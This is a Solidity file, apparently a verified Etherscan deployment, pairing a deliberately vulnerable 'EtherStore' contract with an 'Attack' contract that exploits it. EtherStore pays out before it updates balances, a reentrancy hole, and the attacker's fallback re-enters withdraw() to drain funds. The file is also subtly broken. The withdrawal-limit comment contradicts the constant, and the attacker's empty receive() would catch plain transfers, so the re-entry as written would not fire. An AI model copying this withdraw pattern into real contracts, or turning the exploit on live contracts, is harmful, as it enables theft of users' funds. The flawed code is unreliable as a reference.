/**
 *Submitted for verification at Etherscan.io on 2021-04-20
*/

pragma solidity ^0.7.6;
// SPDX-License-Identifier: MIT
contract EtherStore {
    // Withdrawal limit = 1 ether / week
    uint constant public WITHDRAWAL_LIMIT = 0.001 ether;
    mapping(address => uint) public lastWithdrawTime;
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        require(_amount <= WITHDRAWAL_LIMIT);
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 0.001 ether) {
            etherStore.withdraw(0.001 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether);
        etherStore.deposit{value: 0.001 ether}();
        etherStore.withdraw(0.001 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    receive() external payable {
        // custom function code
    }
}